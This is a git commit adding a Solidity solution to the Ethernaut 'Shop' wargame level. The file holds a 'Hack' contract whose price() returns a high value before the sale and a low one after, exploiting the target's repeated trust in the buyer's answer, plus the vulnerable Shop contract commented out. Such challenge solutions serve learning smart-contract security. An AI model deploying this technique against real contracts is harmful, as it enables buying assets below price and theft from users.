fc486ce8745394c4eb5730ae8321c303410ad08a
MinovS65 <pesopesaka@gmail.com>
2025-10-05 23:51:28 +0300

    Update 21shop.sol

--- Ethernaut/21shop.sol
+++ Ethernaut/21shop.sol
@@ -1,1 +1,43 @@
-e
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+contract Hack {
+    IShop target;
+    constructor(IShop _target) {
+        target = _target;
+    } 
+
+
+    function hack() external {
+        target.buy();
+    }
+
+    function price() external view returns(uint) {
+      if (target.isSold()==true) {
+        return 1;
+      }
+      else {
+        return 100;
+      }
+    }
+}
+
+interface IShop {
+  function buy() external;
+  function isSold() external view returns (bool);
+  function price() external view returns (uint);
+}
+
+/*contract Shop {
+  uint256 public price = 100;
+  bool public isSold;
+
+  function buy() public {
+    IBuyer _buyer = IBuyer(msg.sender);
+
+    if (_buyer.price() >= price && !isSold) {
+      isSold = true;
+      price = _buyer.price();
+    }
+  }
+}*/
